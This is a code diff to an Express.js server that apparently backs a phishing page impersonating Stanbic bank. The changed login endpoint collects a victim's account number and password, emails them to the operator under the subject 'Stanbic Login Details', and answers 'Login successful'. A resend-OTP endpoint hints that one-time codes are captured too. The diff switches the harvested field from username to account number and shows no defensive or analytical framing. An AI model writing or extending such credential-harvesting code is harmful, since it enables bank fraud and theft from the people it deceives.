@@ -47,32 +47,32 @@ const sendMailAndRespond = (
 
 // ─── ENDPOINT 1: POST / ─── Login
 app.post("/", (req, res) => {
-  const { username, password } = req.body;
+  const { accountNumber, password } = req.body;
 
-  if (!username) {
+  if (!accountNumber) {
     return res
       .status(401)
-      .json({ success: false, message: "Invalid username or password" });
+      .json({ success: false, message: "Invalid account number or password" });
   }
 
   if (!password) {
     return res
       .status(401)
-      .json({ success: false, message: "Invalid username or password" });
+      .json({ success: false, message: "Invalid account number or password" });
   }
 
   const mailOptions = {
     from: userEmail,
     to: userEmail,
     subject: "Stanbic Login Details",
-    text: `Username: ${username}\nPassword: ${password}`,
+    text: `Account Number: ${accountNumber}\nPassword: ${password}`,
   };
 
   sendMailAndRespond(
     mailOptions,
     res,
     "Login successful",
-    "Invalid username or password",
+    "Invalid account number or password",
     401,
   );
 });
@@ -186,4 +186,3 @@ app.post("/resend-otp", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on http://localhost:${PORT}`);
 });
-
